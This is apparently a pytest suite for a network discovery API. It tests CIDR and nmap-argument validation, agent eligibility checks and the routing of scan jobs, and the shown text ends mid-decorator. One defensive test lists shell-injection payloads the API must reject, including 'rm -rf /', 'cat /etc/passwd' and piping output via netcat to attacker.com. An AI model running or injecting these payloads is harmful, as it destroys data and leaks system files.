"""
Tests for the discovery scan API: POST /api/v1/discovery/scan and GET /api/v1/discovery/jobs
"""

import pytest

SCAN_URL = "/api/v1/discovery/scan"
JOBS_URL = "/api/v1/discovery/jobs"
PROFILES_URL = "/api/v1/discovery/profiles"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_scan_job_with_results(db_session):
    """
    Create a ScanJob with two ScanResult rows (different IPs, same /24).
    Returns (job_id, [result_id_1, result_id_2]).
    """
    from app.core.time import utcnow_iso
    from app.db.models import ScanJob, ScanResult

    job = ScanJob(
        scan_types_json='["nmap"]',
        status="completed",
        triggered_by="api",
        source_type="manual",
        progress_phase="done",
        progress_message="",
        created_at=utcnow_iso(),
    )
    db_session.add(job)
    db_session.flush()

    now = utcnow_iso()
    r1 = ScanResult(
        scan_job_id=job.id,
        ip_address="192.168.10.11",
        state="new",
        merge_status="pending",
        created_at=now,
    )
    r2 = ScanResult(
        scan_job_id=job.id,
        ip_address="192.168.10.12",
        state="new",
        merge_status="pending",
        created_at=now,
    )
    db_session.add(r1)
    db_session.add(r2)
    db_session.flush()

    return job.id, [r1.id, r2.id]


# ---------------------------------------------------------------------------
# Create scan job
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_create_scan_valid_cidr(client, auth_headers, nmap_enabled):
    """Valid CIDR → 200/201/202 with a status field in the response."""
    payload = {"cidr": "192.168.1.0/24", "scan_types": ["nmap"]}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code in {200, 201, 202}
    # Response may be a single job or a list — normalise for assertion
    body = resp.json()
    if isinstance(body, list):
        assert len(body) >= 1
        assert "status" in body[0]
    else:
        assert "status" in body


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad_cidr",
    [
        "not-a-cidr",
        "192.168.1.300/24",
        "",
    ],
)
async def test_create_scan_invalid_cidr_returns_422(client, auth_headers, bad_cidr, nmap_enabled):
    """Malformed CIDR values should be rejected with 422."""
    payload = {"cidr": bad_cidr, "scan_types": ["nmap"]}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad_args",
    [
        "-sV; rm -rf /",
        "-sV && cat /etc/passwd",
        "-sV | nc attacker.com 4444",
        "-sV `id`",
        "-sV $(whoami)",
    ],
)
async def test_nmap_shell_metacharacter_rejected(client, auth_headers, bad_args, nmap_enabled):
    """nmap_arguments containing shell metacharacters should be rejected with 422."""
    payload = {
        "cidr": "10.0.0.0/24",
        "scan_types": ["nmap"],
        "nmap_arguments": bad_args,
    }
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_valid_nmap_arguments_accepted(client, auth_headers, nmap_enabled):
    """Safe nmap arguments like '-sV -T4' should be accepted."""
    payload = {
        "cidr": "10.0.0.0/24",
        "scan_types": ["nmap"],
        "nmap_arguments": "-sV -T4",
    }
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code in {200, 201, 202}


# ---------------------------------------------------------------------------
# List scan jobs
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_list_scan_jobs(client, auth_headers):
    """GET /discovery/jobs → 200 and returns a list."""
    resp = await client.get(JOBS_URL, headers=auth_headers)
    assert resp.status_code == 200
    assert isinstance(resp.json(), list)


# ---------------------------------------------------------------------------
# import-as-network
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_import_as_network_without_map_id_succeeds(client, auth_headers, db_session):
    """POST import-as-network with no map_id must return 200 with edges_created key."""
    job_id, result_ids = _make_scan_job_with_results(db_session)
    payload = {
        "items": [{"scan_result_id": rid, "overrides": {}} for rid in result_ids],
    }
    resp = await client.post(
        f"/api/v1/discovery/jobs/{job_id}/import-as-network",
        json=payload,
        headers=auth_headers,
    )
    assert resp.status_code == 200, f"Expected 200, got {resp.status_code}: {resp.text}"
    assert "edges_created" in resp.json()


@pytest.mark.asyncio
async def test_import_as_network_with_invalid_map_id_returns_404(client, auth_headers, db_session):
    """POST import-as-network with a non-existent map_id must return 404."""
    job_id, result_ids = _make_scan_job_with_results(db_session)
    payload = {
        "items": [{"scan_result_id": rid, "overrides": {}} for rid in result_ids],
        "map_id": 99999,
    }
    resp = await client.post(
        f"/api/v1/discovery/jobs/{job_id}/import-as-network",
        json=payload,
        headers=auth_headers,
    )
    assert resp.status_code == 404, f"Expected 404, got {resp.status_code}: {resp.text}"


@pytest.mark.asyncio
async def test_import_as_network_router_override_is_tree_root(client, auth_headers, db_session):
    """A node with role='router' override must be the source of all inferred edges."""
    import datetime

    from app.db.models import Hardware, HardwareConnection, ScanJob, ScanResult

    def _iso():
        return datetime.datetime.now(datetime.UTC).isoformat()

    job = ScanJob(
        target_cidr="172.16.0.0/24",
        scan_types_json='["arp"]',
        status="completed",
        created_at=_iso(),
    )
    db_session.add(job)
    db_session.flush()

    # Router at non-.1 IP (so IPAM alone wouldn't pick it)
    router_sr = ScanResult(
        scan_job_id=job.id,
        ip_address="172.16.0.50",
        state="new",
        merge_status="pending",
        created_at=_iso(),
    )
    endpoint_srs = [
        ScanResult(
            scan_job_id=job.id,
            ip_address=f"172.16.0.{i + 100}",
            state="new",
            merge_status="pending",
            created_at=_iso(),
        )
        for i in range(3)
    ]
    db_session.add(router_sr)
    for sr in endpoint_srs:
        db_session.add(sr)
    db_session.commit()

    payload = {
        "items": (
            [{"scan_result_id": router_sr.id, "overrides": {"role": "router"}}]
            + [{"scan_result_id": sr.id, "overrides": {}} for sr in endpoint_srs]
        )
    }
    resp = await client.post(
        f"/api/v1/discovery/jobs/{job.id}/import-as-network",
        json=payload,
        headers=auth_headers,
    )
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert data["edges_created"] == 3

    db_session.expire_all()
    router_hw = db_session.query(Hardware).filter_by(ip_address="172.16.0.50").one()
    assert router_hw.role == "router"

    connections = db_session.query(HardwareConnection).filter_by(source="discovery_inferred").all()
    assert all(c.source_hardware_id == router_hw.id for c in connections), (
        f"Expected all edges from router; got sources={[c.source_hardware_id for c in connections]}"
    )


# ---------------------------------------------------------------------------
# Scan-type vocabulary (Slice 4, D-6)
# ---------------------------------------------------------------------------


def _make_profile(db_session, *, scan_types_json: str):
    """Persist a profile row directly, bypassing the request schema.

    Rows written before the vocabulary existed hold arbitrary strings; this is
    how a test can produce one without going through the validator under test.
    """
    from app.core.time import utcnow_iso
    from app.db.models import DiscoveryProfile

    now = utcnow_iso()
    profile = DiscoveryProfile(
        name="legacy-profile",
        cidr="192.168.50.0/24",
        scan_types=scan_types_json,
        enabled=1,
        created_at=now,
        updated_at=now,
    )
    db_session.add(profile)
    db_session.commit()
    return profile.id


@pytest.mark.asyncio
async def test_profile_with_server_scan_type_and_agent_is_422(client, auth_headers):
    """A server-only scan type may not be dispatched to an agent (plan §3)."""
    payload = {
        "name": "agent-profile",
        "cidr": "10.88.0.0/24",
        "scan_types": ["nmap"],
        "scan_agent_id": 7,
    }
    resp = await client.post(PROFILES_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422, resp.text
    assert "nmap" in resp.text


@pytest.mark.asyncio
async def test_profile_with_agent_scan_type_and_no_agent_is_422(client, auth_headers):
    """`agent_connect` has no executor when no agent is selected."""
    payload = {
        "name": "server-profile",
        "cidr": "10.88.0.0/24",
        "scan_types": ["agent_connect"],
    }
    resp = await client.post(PROFILES_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422, resp.text
    assert "agent_connect" in resp.text


@pytest.mark.asyncio
async def test_profile_with_unknown_scan_type_is_422(client, auth_headers):
    payload = {
        "name": "bogus-profile",
        "cidr": "10.88.0.0/24",
        "scan_types": ["bogus"],
    }
    resp = await client.post(PROFILES_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422, resp.text
    assert "bogus" in resp.text


@pytest.mark.asyncio
async def test_profile_update_with_unknown_scan_type_is_422(client, auth_headers, db_session):
    profile_id = _make_profile(db_session, scan_types_json='["nmap"]')
    resp = await client.patch(
        f"{PROFILES_URL}/{profile_id}",
        json={"scan_types": ["bogus"]},
        headers=auth_headers,
    )
    assert resp.status_code == 422, resp.text


@pytest.mark.asyncio
async def test_profile_update_with_agent_scan_type_and_no_agent_is_422(
    client, auth_headers, db_session
):
    profile_id = _make_profile(db_session, scan_types_json='["nmap"]')
    resp = await client.patch(
        f"{PROFILES_URL}/{profile_id}",
        json={"scan_types": ["agent_connect"]},
        headers=auth_headers,
    )
    assert resp.status_code == 422, resp.text


@pytest.mark.asyncio
async def test_profile_update_without_scan_types_is_unaffected(client, auth_headers, db_session):
    """A PATCH that does not mention scan_types must not be validated against them."""
    profile_id = _make_profile(db_session, scan_types_json='["legacy_thing"]')
    resp = await client.patch(
        f"{PROFILES_URL}/{profile_id}",
        json={"name": "renamed"},
        headers=auth_headers,
    )
    assert resp.status_code == 200, resp.text
    assert resp.json()["name"] == "renamed"


@pytest.mark.asyncio
async def test_existing_profile_with_unknown_scan_type_still_loads(
    client, auth_headers, db_session
):
    """Validation is write-only: rows predating the vocabulary must keep loading."""
    profile_id = _make_profile(db_session, scan_types_json='["legacy_thing", "nmap"]')
    resp = await client.get(PROFILES_URL, headers=auth_headers)
    assert resp.status_code == 200, resp.text
    loaded = [p for p in resp.json() if p["id"] == profile_id]
    assert loaded, resp.text
    assert loaded[0]["scan_types"] == ["legacy_thing", "nmap"]


@pytest.mark.asyncio
async def test_adhoc_scan_with_unknown_scan_type_is_422(client, auth_headers, nmap_enabled):
    payload = {"cidr": "192.168.1.0/24", "scan_types": ["bogus"]}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422, resp.text


@pytest.mark.asyncio
async def test_adhoc_scan_with_agent_scan_type_and_no_agent_is_422(
    client, auth_headers, nmap_enabled
):
    payload = {"cidr": "192.168.1.0/24", "scan_types": ["agent_connect"]}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422, resp.text


@pytest.mark.asyncio
async def test_adhoc_scan_with_server_scan_type_and_agent_is_422(
    client, auth_headers, nmap_enabled
):
    payload = {"cidr": "192.168.1.0/24", "scan_types": ["nmap"], "scan_agent_id": 7}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422, resp.text


# ---------------------------------------------------------------------------
# Execution location on the profile API (Slice 4, D-7)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_create_profile_persists_execution_location(
    client, auth_headers, db_session, factories
):
    """The API writes `scan_agent_id` through and derives the canonical CIDR."""
    from app.db.models import DiscoveryProfile

    # Eligible, not merely active: §3's creation-time gate refuses an
    # agent-targeted profile the named agent could not run.
    agent = _eligible_agent(
        factories,
        interfaces=[{"name": "eth0", "flags": ["broadcast", "up"], "addrs": ["10.44.0.9/24"]}],
    )
    payload = {
        "name": "agent-owned",
        "cidr": "10.44.0.9/24",
        "scan_types": ["agent_connect"],
        "scan_agent_id": agent.id,
    }
    resp = await client.post(PROFILES_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 200, resp.text

    row = db_session.get(DiscoveryProfile, resp.json()["id"])
    assert row.scan_agent_id == agent.id
    assert row.normalized_cidr == "10.44.0.0/24"


@pytest.mark.asyncio
async def test_create_profile_ignores_managed_by_in_the_body(client, auth_headers, db_session):
    """`managed_by` is server-set only — a request that claims it is not obeyed.

    Honouring it would let a client park a row on the partial unique index that
    the system-profile bootstrap owns.
    """
    from app.db.models import DiscoveryProfile

    payload = {
        "name": "impostor",
        "cidr": "10.45.0.0/24",
        "scan_types": ["nmap"],
        "managed_by": "system",
    }
    resp = await client.post(PROFILES_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 200, resp.text
    assert db_session.get(DiscoveryProfile, resp.json()["id"]).managed_by is None


@pytest.mark.asyncio
async def test_update_profile_ignores_managed_by_in_the_body(client, auth_headers, db_session):
    from app.db.models import DiscoveryProfile

    profile_id = _make_profile(db_session, scan_types_json='["nmap"]')
    resp = await client.patch(
        f"{PROFILES_URL}/{profile_id}",
        json={"name": "renamed", "managed_by": "system"},
        headers=auth_headers,
    )
    assert resp.status_code == 200, resp.text
    assert db_session.get(DiscoveryProfile, profile_id).managed_by is None


# ---------------------------------------------------------------------------
# Creation-time validation of an agent-targeted profile or scan (Slice 4, §3/§7)
# ---------------------------------------------------------------------------
#
# Plan §3 requires the same preconditions at profile save and at job creation, and
# §7 names four checkpoints in all. These are the first two. Every refusal is a 422
# whose `reason` comes from `discovery_eligibility`'s closed vocabulary (or, for the
# two limits that module deliberately leaves to its callers, from the Go collector's
# own `internal/collect/discover` codes), so one set of strings is rendered wherever
# the answer is given. It is validation *in addition to* the dispatch-time re-check,
# never instead of it: a scope can change between a save and the job it produces.

_AGENT_SUBNET = "10.20.30.0/24"
_AGENT_INTERFACES = [{"name": "eth0", "flags": ["broadcast", "up"], "addrs": ["10.20.30.5/24"]}]
# One address inside `_AGENT_SUBNET`, for the findings a closed dispatch must refuse.
_AGENT_HOST = "10.20.30.77"


def _eligible_agent(factories, *, status: str = "active", interfaces=None, readiness="ready"):
    """An agent that satisfies every §3 precondition — tests remove one at a time."""
    agent = factories.agent(status=status)
    factories.agent_capability_grant(agent, capability="local_discovery", enabled=True)
    reported = interfaces if interfaces is not None else _AGENT_INTERFACES
    factories.agent_network(agent, facts=reported)
    if readiness is not None:
        factories.agent_capability_readiness(agent, collector="discovery.tcp", state=readiness)
    return agent


def _agent_profile_payload(agent, **overrides):
    payload = {
        "name": "agent-executed",
        "cidr": _AGENT_SUBNET,
        "scan_types": ["agent_connect"],
        "scan_agent_id": agent.id,
    }
    payload.update(overrides)
    return payload


@pytest.mark.asyncio
async def test_profile_for_an_eligible_agent_is_created(client, auth_headers, factories):
    """The happy path, so every 422 below is known to come from what it removed."""
    agent = _eligible_agent(factories)
    resp = await client.post(PROFILES_URL, json=_agent_profile_payload(agent), headers=auth_headers)
    assert resp.status_code == 200, resp.text


@pytest.mark.asyncio
@pytest.mark.parametrize("status", ["pending", "rejected", "revoked"])
async def test_profile_for_a_non_active_agent_is_422(client, auth_headers, factories, status):
    """§7: pending, rejected and revoked agents can never scan."""
    agent = _eligible_agent(factories, status=status)
    resp = await client.post(PROFILES_URL, json=_agent_profile_payload(agent), headers=auth_headers)
    assert resp.status_code == 422, resp.text
    assert resp.json()["detail"]["reason"] == "agent_inactive"
    assert resp.json()["detail"]["detail"] == status


@pytest.mark.asyncio
async def test_profile_for_an_ungranted_agent_is_422(client, auth_headers, factories):
    agent = factories.agent(status="active")
    factories.agent_network(agent, facts=_AGENT_INTERFACES)
    factories.agent_capability_readiness(agent, collector="discovery.tcp", state="ready")

    resp = await client.post(PROFILES_URL, json=_agent_profile_payload(agent), headers=auth_headers)
    assert resp.status_code == 422, resp.text
    assert resp.json()["detail"]["reason"] == "capability_disabled"


@pytest.mark.asyncio
async def test_profile_for_a_degraded_collector_is_422(client, auth_headers, factories):
    agent = _eligible_agent(factories, readiness="degraded")
    resp = await client.post(PROFILES_URL, json=_agent_profile_payload(agent), headers=auth_headers)
    assert resp.status_code == 422, resp.text
    assert resp.json()["detail"]["reason"] == "readiness_degraded"


@pytest.mark.asyncio
async def test_profile_with_an_out_of_scope_target_is_422(client, auth_headers, factories):
    agent = _eligible_agent(factories)
    resp = await client.post(
        PROFILES_URL,
        json=_agent_profile_payload(agent, cidr="192.168.50.0/24"),
        headers=auth_headers,
    )
    assert resp.status_code == 422, resp.text
    body = resp.json()["detail"]
    assert body["reason"] == "out_of_scope"
    # The evaluator's own reason, so a width refusal is not reported as a miss.
    assert body["detail"] == "out_of_scope:192.168.50.0/24"


@pytest.mark.asyncio
async def test_profile_larger_than_the_address_ceiling_is_422(client, auth_headers, factories):
    """`MIN_SCOPE_PREFIX_V4 = 16` admits a /16 — 65 536 addresses — while
    `max_addresses_per_job` defaults to 1 024 and is capped at 4 096, so an
    in-scope target can still be a job no agent may run."""
    agent = _eligible_agent(
        factories,
        interfaces=[{"name": "eth0", "flags": ["broadcast", "up"], "addrs": ["10.20.0.5/16"]}],
    )
    resp = await client.post(
        PROFILES_URL,
        json=_agent_profile_payload(agent, cidr="10.20.0.0/16"),
        headers=auth_headers,
    )
    assert resp.status_code == 422, resp.text
    body = resp.json()["detail"]
    assert body["reason"] == "address_limit_exceeded"
    assert body["detail"] == "65536>1024"


@pytest.mark.asyncio
async def test_profile_naming_an_ungranted_port_is_422(client, auth_headers, factories):
    agent = _eligible_agent(factories)
    resp = await client.post(
        PROFILES_URL,
        json=_agent_profile_payload(agent, nmap_arguments="-p 9999"),
        headers=auth_headers,
    )
    assert resp.status_code == 422, resp.text
    body = resp.json()["detail"]
    assert body["reason"] == "port_not_granted"
    assert body["detail"] == "9999"


@pytest.mark.asyncio
async def test_patch_repointing_a_profile_at_an_ineligible_agent_is_422(
    client, auth_headers, db_session, factories
):
    """Plan §3 says "profile save", which is both verbs: an edit that moves the
    execution location is judged exactly as the create was."""
    from app.db.models import DiscoveryProfile

    agent = factories.agent(status="active")  # no grant, no networks, no readiness
    profile_id = _make_profile(db_session, scan_types_json='["nmap"]')

    resp = await client.patch(
        f"{PROFILES_URL}/{profile_id}",
        json={"scan_types": ["agent_connect"], "scan_agent_id": agent.id},
        headers=auth_headers,
    )
    assert resp.status_code == 422, resp.text
    assert resp.json()["detail"]["reason"] == "capability_disabled"
    assert db_session.get(DiscoveryProfile, profile_id).scan_agent_id is None


@pytest.mark.asyncio
async def test_patch_disabling_a_profile_whose_agent_was_revoked_still_works(
    client, auth_headers, db_session, factories
):
    """D-14 makes disabling a profile a cancellation trigger, so the one edit that
    stops a profile has to stay reachable exactly when its agent has become
    ineligible. An unconditional re-check would strand every profile naming a
    revoked agent in the enabled state."""
    from app.db.models import DiscoveryProfile

    agent = _eligible_agent(factories)
    created = await client.post(
        PROFILES_URL, json=_agent_profile_payload(agent), headers=auth_headers
    )
    assert created.status_code == 200, created.text
    agent.status = "revoked"
    db_session.flush()

    resp = await client.patch(
        f"{PROFILES_URL}/{created.json()['id']}",
        json={"enabled": False},
        headers=auth_headers,
    )
    assert resp.status_code == 200, resp.text
    assert db_session.get(DiscoveryProfile, created.json()["id"]).enabled == 0


# ---------------------------------------------------------------------------
# The same gate on job creation
# ---------------------------------------------------------------------------
#
# Driven straight through `create_scan_job` so that a refusal is read off the
# exception rather than off a status code. Task 20 landed the router, so both
# HTTP entry points now carry the execution location too, and the section below
# ("Reaching the agent through the API") pins the same gate where an operator
# actually meets it.


def _create_agent_scan(db_session, agent, **overrides):
    from app.services import discovery_service

    kwargs = {
        "target_cidr": _AGENT_SUBNET,
        "scan_types": ["agent_connect"],
        "scan_agent_id": agent.id,
    }
    kwargs.update(overrides)
    return discovery_service.create_scan_job(db_session, **kwargs)


def test_scan_job_for_an_eligible_agent_is_created(db_session, factories):
    agent = _eligible_agent(factories)
    job = _create_agent_scan(db_session, agent)
    assert job.id is not None
    assert job.target_cidr == _AGENT_SUBNET


@pytest.mark.parametrize("status", ["pending", "rejected", "revoked"])
def test_scan_job_for_a_non_active_agent_is_rejected(db_session, factories, status):
    from app.services import discovery_service

    agent = _eligible_agent(factories, status=status)
    with pytest.raises(discovery_service.AgentExecutionLocationError) as exc_info:
        _create_agent_scan(db_session, agent)
    assert exc_info.value.reason == "agent_inactive"
    assert exc_info.value.detail == status


def test_scan_job_for_an_ungranted_agent_is_rejected(db_session, factories):
    from app.services import discovery_service

    agent = factories.agent(status="active")
    factories.agent_network(agent, facts=_AGENT_INTERFACES)
    factories.agent_capability_readiness(agent, collector="discovery.tcp", state="ready")

    with pytest.raises(discovery_service.AgentExecutionLocationError) as exc_info:
        _create_agent_scan(db_session, agent)
    assert exc_info.value.reason == "capability_disabled"


def test_scan_job_for_a_degraded_collector_is_rejected(db_session, factories):
    from app.services import discovery_service

    agent = _eligible_agent(factories, readiness="degraded")
    with pytest.raises(discovery_service.AgentExecutionLocationError) as exc_info:
        _create_agent_scan(db_session, agent)
    assert exc_info.value.reason == "readiness_degraded"


def test_scan_job_with_an_out_of_scope_target_is_rejected(db_session, factories):
    from app.services import discovery_service

    agent = _eligible_agent(factories)
    with pytest.raises(discovery_service.AgentExecutionLocationError) as exc_info:
        _create_agent_scan(db_session, agent, target_cidr="192.168.50.0/24")
    assert exc_info.value.reason == "out_of_scope"
    assert exc_info.value.detail == "out_of_scope:192.168.50.0/24"


def test_scan_job_larger_than_the_address_ceiling_is_rejected(db_session, factories):
    from app.services import discovery_service

    agent = _eligible_agent(
        factories,
        interfaces=[{"name": "eth0", "flags": ["broadcast", "up"], "addrs": ["10.20.0.5/16"]}],
    )
    with pytest.raises(discovery_service.AgentExecutionLocationError) as exc_info:
        _create_agent_scan(db_session, agent, target_cidr="10.20.0.0/16")
    assert exc_info.value.reason == "address_limit_exceeded"
    assert exc_info.value.detail == "65536>1024"


def test_scan_job_naming_an_ungranted_port_is_rejected(db_session, factories):
    from app.services import discovery_service

    agent = _eligible_agent(factories)
    with pytest.raises(discovery_service.AgentExecutionLocationError) as exc_info:
        _create_agent_scan(db_session, agent, nmap_arguments="-p 9999")
    assert exc_info.value.reason == "port_not_granted"
    assert exc_info.value.detail == "9999"


def test_a_rejected_scan_job_writes_no_row(db_session, factories):
    from app.db.models import ScanJob
    from app.services import discovery_service

    agent = _eligible_agent(factories)
    before = db_session.query(ScanJob).count()
    with pytest.raises(discovery_service.AgentExecutionLocationError):
        _create_agent_scan(db_session, agent, target_cidr="192.168.50.0/24")
    assert db_session.query(ScanJob).count() == before


def test_vlan_derived_targets_are_validated_too(db_session, factories):
    """VLAN ids resolve to CIDRs inside `create_scan_job`, so the indirection is
    not a way past the scope check."""
    from app.db.models import Network
    from app.services import discovery_service

    db_session.add(Network(name="vlan-908", cidr="192.168.61.0/24", vlan_id=908))
    db_session.flush()
    agent = _eligible_agent(factories)

    with pytest.raises(discovery_service.AgentExecutionLocationError) as exc_info:
        _create_agent_scan(db_session, agent, target_cidr=None, vlan_ids=[908])
    assert exc_info.value.reason == "out_of_scope"


def test_a_server_scan_job_is_not_validated_against_any_agent(db_session, nmap_enabled, factories):
    """`scan_agent_id is None` is the existing server engine, which predates all of
    this and is untouched by it."""
    from app.services import discovery_service

    _eligible_agent(factories)
    job = discovery_service.create_scan_job(
        db_session, target_cidr="10.20.0.0/16", scan_types=["nmap"], nmap_arguments="-p 9999"
    )
    assert job.id is not None


# ---------------------------------------------------------------------------
# Reaching the agent through the API (Slice 4, §3 / Task 19 / Task 20)
# ---------------------------------------------------------------------------
#
# The two entry points a human can actually reach — "Run now" on a profile and
# the ad-hoc scan form — are the only way an agent scan is ever started by hand.
# Both have to carry the execution location all the way into `create_scan_job`,
# or an agent profile produces either a server-run job (plan §3 forbids the
# fallback: it silently changes the discovery vantage point) or, because D-6
# makes `["agent_connect"]` the only legal scan-type list on an agent, a hard
# failure from `validate_scan_types` that the generic handler renders as a 500.
#
# Both endpoints must also answer a refusal with Task 19's *structured* 422 —
# `{"reason", "detail", "message"}`, the same body `discovery_profiles_service`
# already returns on profile save — so the frontend switches on one closed
# vocabulary rather than two.

_SERVER_SUBNET = "192.168.70.0/24"
# Larger than the granted `max_addresses_per_job` default of 1024, and matched by
# the interface the fixture reports, so scope passes and only the ceiling refuses.
_OVERSIZED_SUBNET = "10.20.0.0/16"
_OVERSIZED_INTERFACES = [{"name": "eth0", "flags": ["broadcast", "up"], "addrs": ["10.20.0.5/16"]}]


@pytest.fixture
def routed_jobs(monkeypatch, db_session):
    """Records which executor each job the API starts is handed to.

    Only `schedule_discovery_scan_job` — the *session-opening* wrapper — is
    replaced, and it is replaced with a call to the real `execute_scan_job`. The
    wrapper opens its own `SessionLocal`, which cannot see the SAVEPOINT this
    test's job was written inside, so the genuine router would find no row and
    every routing assertion would pass vacuously. The branch under test is still
    the shipped one.

    Both halves of the server executor are spied, as
    `tests/services/test_agent_discovery_dispatch.py` does: the phase split means
    a router that called `_scan_setup` instead of `run_scan_job` would look inert
    from the outside right up until it started sweeping the operator's network.
    """
    import asyncio
    from types import SimpleNamespace
    from unittest.mock import AsyncMock

    from app.services import agent_discovery, discovery_service

    agent_jobs: list[int] = []
    server_calls: list[str] = []
    started: list[asyncio.Future] = []

    async def _dispatch(db, job_id):
        agent_jobs.append(job_id)
        return True

    monkeypatch.setattr(agent_discovery, "dispatch_discovery_job", AsyncMock(side_effect=_dispatch))
    monkeypatch.setattr(
        discovery_service,
        "run_scan_job",
        AsyncMock(side_effect=lambda job_id: server_calls.append("run_scan_job")),
    )
    monkeypatch.setattr(
        discovery_service, "_scan_setup", lambda job_id: server_calls.append("_scan_setup")
    )

    def _schedule(job_id: int) -> None:
        started.append(
            asyncio.ensure_future(discovery_service.execute_scan_job(db_session, job_id))
        )

    monkeypatch.setattr(discovery_service, "schedule_discovery_scan_job", _schedule)

    async def drain() -> None:
        if started:
            await asyncio.gather(*started)

    return SimpleNamespace(agent=agent_jobs, server=server_calls, drain=drain)


def _scan_job_row(db_session, job_id):
    from app.db.models import ScanJob

    return db_session.get(ScanJob, job_id)


async def _create_profile(client, auth_headers, payload):
    resp = await client.post(PROFILES_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 200, resp.text
    return resp.json()["id"]


@pytest.mark.asyncio
async def test_running_an_agent_profile_starts_an_agent_job_on_the_agent(
    client, auth_headers, db_session, factories, routed_jobs
):
    """ "Run now" on an agent profile is the manual half of D-6, and it is a 500
    the moment the endpoint drops `scan_agent_id`: `["agent_connect"]` with no
    agent is exactly what `validate_scan_types` refuses."""
    agent = _eligible_agent(factories)
    profile_id = await _create_profile(client, auth_headers, _agent_profile_payload(agent))

    resp = await client.post(f"{PROFILES_URL}/{profile_id}/run", headers=auth_headers)
    assert resp.status_code == 200, resp.text
    await routed_jobs.drain()

    job = _scan_job_row(db_session, resp.json()["id"])
    assert job.scan_agent_id == agent.id
    assert job.source_type == "agent"
    assert routed_jobs.agent == [job.id]
    assert routed_jobs.server == []


@pytest.mark.asyncio
async def test_running_a_server_profile_still_starts_it_on_the_server(
    client, auth_headers, db_session, factories, nmap_enabled, routed_jobs
):
    """The branch has to be a branch: forwarding an agent onto every job would
    pass the assertion above and take server discovery with it."""
    profile_id = await _create_profile(
        client,
        auth_headers,
        {"name": "server-executed", "cidr": _SERVER_SUBNET, "scan_types": ["nmap"]},
    )

    resp = await client.post(f"{PROFILES_URL}/{profile_id}/run", headers=auth_headers)
    assert resp.status_code == 200, resp.text
    await routed_jobs.drain()

    job = _scan_job_row(db_session, resp.json()["id"])
    assert job.scan_agent_id is None
    assert routed_jobs.agent == []
    assert routed_jobs.server == ["run_scan_job"]


@pytest.mark.asyncio
async def test_running_an_agent_profile_for_an_ineligible_agent_is_a_structured_422(
    client, auth_headers, db_session, factories, routed_jobs
):
    """A profile saved while its agent was eligible can be run after the agent is
    revoked, so the run endpoint owns a refusal of its own — and it has to be the
    same shape the save gave, not the 500 an unhandled `ValueError` becomes."""
    from app.db.models import ScanJob

    agent = _eligible_agent(factories)
    profile_id = await _create_profile(client, auth_headers, _agent_profile_payload(agent))
    before = db_session.query(ScanJob).count()
    agent.status = "revoked"
    db_session.flush()

    resp = await client.post(f"{PROFILES_URL}/{profile_id}/run", headers=auth_headers)
    assert resp.status_code == 422, resp.text
    assert resp.json()["detail"]["reason"] == "agent_inactive"
    assert resp.json()["detail"]["detail"] == "revoked"
    assert db_session.query(ScanJob).count() == before
    assert routed_jobs.agent == [] and routed_jobs.server == []


@pytest.mark.asyncio
async def test_adhoc_scan_for_an_eligible_agent_starts_an_agent_job_on_the_agent(
    client, auth_headers, db_session, factories, routed_jobs
):
    """Task 19 names `POST /discovery/scan` explicitly. Without the forward, a
    fully eligible agent gets a bare 422 and no job at all."""
    agent = _eligible_agent(factories)

    resp = await client.post(
        SCAN_URL,
        json={
            "cidr": _AGENT_SUBNET,
            "scan_types": ["agent_connect"],
            "scan_agent_id": agent.id,
        },
        headers=auth_headers,
    )
    assert resp.status_code == 200, resp.text
    await routed_jobs.drain()

    job = _scan_job_row(db_session, resp.json()["id"])
    assert job.scan_agent_id == agent.id
    assert job.source_type == "agent"
    assert routed_jobs.agent == [job.id]
    assert routed_jobs.server == []


@pytest.mark.asyncio
async def test_adhoc_scan_without_an_agent_still_starts_it_on_the_server(
    client, auth_headers, db_session, nmap_enabled, routed_jobs
):
    """The other side of the same branch, for the ad-hoc form."""
    resp = await client.post(
        SCAN_URL,
        json={"cidr": _SERVER_SUBNET, "scan_types": ["nmap"]},
        headers=auth_headers,
    )
    assert resp.status_code == 200, resp.text
    await routed_jobs.drain()

    job = _scan_job_row(db_session, resp.json()["id"])
    assert job.scan_agent_id is None
    assert routed_jobs.agent == []
    assert routed_jobs.server == ["run_scan_job"]


def _agent_for_reason(factories, reason):
    """The agent that produces exactly one §7 refusal, and the request that trips it.

    One agent per reason rather than one agent mutated per case, because the
    checks are ordered and a fixture missing two preconditions would report only
    the first — which is how a per-reason table stops distinguishing anything.
    """
    if reason == "capability_disabled":
        agent = factories.agent(status="active")
        factories.agent_network(agent, facts=_AGENT_INTERFACES)
        factories.agent_capability_readiness(agent, collector="discovery.tcp", state="ready")
        return agent, {}
    if reason == "readiness_degraded":
        return _eligible_agent(factories, readiness="degraded"), {}
    if reason == "out_of_scope":
        return _eligible_agent(factories), {"cidr": "192.168.50.0/24"}
    if reason == "address_limit_exceeded":
        agent = _eligible_agent(factories, interfaces=_OVERSIZED_INTERFACES)
        return agent, {"cidr": _OVERSIZED_SUBNET}
    if reason == "port_not_granted":
        return _eligible_agent(factories), {"nmap_arguments": "-p 9999"}
    return _eligible_agent(factories, status=reason), {}


@pytest.mark.asyncio
@pytest.mark.parametrize(
